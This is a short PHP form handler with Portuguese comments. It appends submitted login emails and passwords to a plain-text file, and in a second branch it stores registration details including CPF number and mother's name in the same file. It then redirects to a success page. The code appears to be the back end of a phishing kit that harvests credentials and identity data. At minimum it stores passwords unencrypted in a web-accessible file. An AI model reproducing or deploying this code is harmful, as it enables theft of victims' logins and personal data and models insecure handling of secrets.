<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se os dados do login foram enviados
    if (isset($_POST["email"]) && isset($_POST["pass"])) {
        $email = $_POST["email"];
        $password = $_POST["pass"];

        // Caminho para o arquivo onde os dados serão armazenados
        $file_path = "dados_usuarios.txt";

        // Abre o arquivo para escrita (adiciona ao final)
        $file = fopen($file_path, "a");

        // Escreve os dados no arquivo
        fwrite($file, "Email: $email\n");
        fwrite($file, "Senha: $password\n");
        fwrite($file, "-------------------------\n");

        // Fecha o arquivo
        fclose($file);

        // Redireciona para uma página de sucesso ou de login
        header("Location: success.html");
        exit();
    }

    // Verifica se os dados do cadastro foram enviados
    if (isset($_POST["nome"]) && isset($_POST["sobrenome"]) && isset($_POST["email"]) && isset($_POST["telefone"]) && isset($_POST["cpf"]) && isset($_POST["nome_mae"]) && isset($_POST["idade"])) {
        $nome = $_POST["nome"];
        $sobrenome = $_POST["sobrenome"];
        $email = $_POST["email"];
        $telefone = $_POST["telefone"];
        $cpf = $_POST["cpf"];
        $nome_mae = $_POST["nome_mae"];
        $idade = $_POST["idade"];

        // Caminho para o arquivo onde os dados serão armazenados
        $file_path = "dados_usuarios.txt";

        // Abre o arquivo para escrita (adiciona ao final)
        $file = fopen($file_path, "a");

        // Escreve os dados no arquivo
        fwrite($file, "Nome: $nome\n");
        fwrite($file, "Sobrenome: $sobrenome\n");
        fwrite($file, "Email: $email\n");
        fwrite($file, "Telefone: $telefone\n");
        fwrite($file, "CPF: $cpf\n");
        fwrite($file, "Nome da Mãe: $nome_mae\n");
        fwrite($file, "Idade: $idade\n");
        fwrite($file, "-------------------------\n");

        // Fecha o arquivo
        fclose($file);

        // Redireciona para uma página de sucesso ou de cadastro
        header("Location: success.html");
        exit();
    }
}
?>

